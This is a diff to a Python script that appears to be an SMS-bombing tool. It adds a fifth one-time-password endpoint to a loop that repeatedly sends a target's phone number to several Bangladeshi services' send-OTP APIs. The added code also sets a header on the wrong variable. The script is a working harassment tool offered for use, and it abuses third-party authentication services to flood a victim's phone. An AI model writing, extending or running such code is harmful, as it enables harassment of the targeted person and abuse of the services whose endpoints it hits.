@@ -41,13 +41,25 @@ headers2["Content-Length"] = "0"
 bio="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
 
 #4
-
 quiz = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
 
 headers3 = CaseInsensitiveDict()
 headers3["Content-Type"] = "application/x-www-form-urlencoded"
 
 data3 = "phone="+number
+
+#5
+tms = "https://dev.10minuteschool.com/api/v4/auth/sendOtp?"
+
+headers5 = CaseInsensitiveDict()
+headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "contact=88"+number
+
+
+
+
+
 
 print(G + "SMS Sending...")
 sleep(1)
@@ -56,5 +68,7 @@ for j in range(amount):
     resp1 = requests.post(daktar, headers=headers2)
     requests.get(bio)
     resp2 = requests.post(quiz, headers=headers3, data=data3)
+    resp5 = requests.post(tms, headers=headers5, data=data5)
+
     print("")
     print(G + "[✓] "+str(j+1)+" SMS Sent Successful...")
